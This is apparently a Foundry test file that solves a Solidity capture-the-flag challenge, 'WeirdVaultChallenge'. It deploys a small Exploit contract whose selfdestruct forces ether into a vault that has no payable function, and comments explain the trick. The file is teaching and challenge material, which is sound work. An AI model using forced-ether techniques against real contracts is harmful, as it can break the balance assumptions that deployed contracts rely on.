// SPDX-License-Identifier: Unlicense
pragma solidity ^0.7.6;
pragma abicoder v2;

import "./utils/BaseTest.sol";

import "src/accounts/WeirdVaultChallenge.sol";

contract Exploit {
    constructor() payable {}

    function exploit(address weirdVault) external {
        selfdestruct(payable(weirdVault));
    }
}

contract TestWeirdVaultChallenge is BaseTest {
    WeirdVaultChallenge private challenge;

    address private player;

    constructor() {
        // Created (during `setUp()`) users will be available in `users` state variable

        string[] memory userLabels = new string[](1);
        userLabels[0] = "Player";
        preSetUp(userLabels.length, 100 ether, userLabels);
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();

        challenge = new WeirdVaultChallenge();
        player = users[0];
    }

    function testExploit() public {
        runTest();
    }

    function exploit() internal override {
        uint256 balanceBefore = player.balance;

        vm.startPrank(player);

        // To win the challenge we just need to send some ether to the contract
        // Because it does not have `payable` function nor fallback/receive
        // the only way to do that is to create an exploit contract that will
        // `selfdestruct` sending the contained ether to the `WeirdVaultChallenge`
        // `selfdestruct` is able to "force" the receiving address to accept the ether
        // even if it has no function to receive it
        uint256 amountToVault = 1 ether;
        Exploit exploitContract = new Exploit{value: amountToVault}();
        exploitContract.exploit(address(challenge));

        challenge.complete();

        assertEq(player.balance, balanceBefore);

        vm.stopPrank();
    }

    function success() internal override {
        /** SUCCESS CONDITIONS */

        assertEq(challenge.isSolved(), true);
    }
}
